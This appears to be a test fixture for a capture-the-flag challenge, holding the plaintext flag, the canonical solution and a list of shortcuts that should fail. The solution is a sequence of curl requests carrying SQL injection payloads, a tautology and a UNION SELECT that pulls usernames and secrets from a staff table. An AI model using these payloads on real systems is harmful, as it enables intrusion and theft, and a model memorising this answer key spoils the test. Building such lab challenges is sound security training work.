// TEST-ONLY: the plaintext flag and canonical solution live here, never in the bundle.
export const FLAG = 'FLAG{un10n_s3l3ct_st4r}';

/** The vulnerable endpoint concatenates the q parameter straight into the SQL. */
export const SOLUTION: readonly string[] = [
  `curl "http://shop.novacorp.internal/search?q=Acme"`,
  `curl "http://shop.novacorp.internal/search?q='"`,
  `curl "http://shop.novacorp.internal/search?q=' OR '1'='1"`,
  `curl "http://shop.novacorp.internal/search?q=' UNION SELECT username, secret, role FROM staff -- "`,
  `submit ${FLAG}`,
];

/** Obvious shortcuts that must NOT reveal or accept the flag. */
export const SHORTCUTS_THAT_FAIL: readonly string[] = [
  `curl "http://shop.novacorp.internal/search?q=Acme"`,
  `curl "http://shop.novacorp.internal/staff"`,
  `curl "http://shop.novacorp.internal/search?q=' UNION SELECT secret FROM staff -- "`,
];
